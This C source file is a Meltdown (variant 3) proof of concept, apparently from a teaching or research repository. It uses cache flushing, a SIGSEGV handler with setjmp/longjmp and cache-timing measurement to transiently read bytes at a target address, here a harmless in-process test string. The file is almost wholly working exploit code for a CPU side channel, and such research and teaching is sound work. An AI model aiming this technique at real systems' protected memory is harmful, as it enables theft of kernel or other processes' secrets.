#define _POSIX_C_SOURCE 200809L
#define _GNU_SOURCE

#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "../cache.h"

static jmp_buf longjmp_buf;

const char *test CACHE_LINE_ALIGNED = "The answer is 42!";
char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;

void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void segfault_handler_callback(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(longjmp_buf, 1);
}

void setup_signal_handler() { signal(SIGSEGV, segfault_handler_callback); }

char meltdown_v3(size_t _target_addr) {
  int rounds = 100;
  volatile char *legal = malloc(sizeof(char));
  size_t results[256] = {0};

  while (rounds--) {
    for (size_t i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }

    if (!setjmp(longjmp_buf)) {
      // fill the pipeline. Increases accuracy
      *(legal);
      *(legal);
      *(legal);
      *(legal);

      // Assembly version
      // asm volatile("1:\n"
      // 						 "movzx (%%rcx),
      // %%rax\n" 						 "shl $12,
      // %%rax\n" 						 "jz 1b\n"
      // "movq (%%rbx,%%rax,1), %%rbx\n"
      // ::"c"(_target_addr),
      // "b"(probe_buffer) 						 :
      // "rax");

      // C Version
      char temp = probe[(*(volatile char *)_target_addr) * CACHE_LINE_SIZE];
    }

    measure_cache(probe, results);
    int read = valid_read(results, 256);

    if (read != -1) {
      return (char)read;
    }
  }

  return 0;
}

int main(int argc, char *argv[]) {
  pin_cpu0();
  setup_signal_handler();

  /// Write probe to RAM and put it in non COW pages
  for (int i = 0; i < sizeof(probe); i++) {
    probe[i] = 1;
  }

  for (int i = 0; i < strlen(test); i++) {
    char byte = meltdown_v3((size_t)test + i);
    printf("%c", byte);
  }
  printf("\n");

  return 0;
}
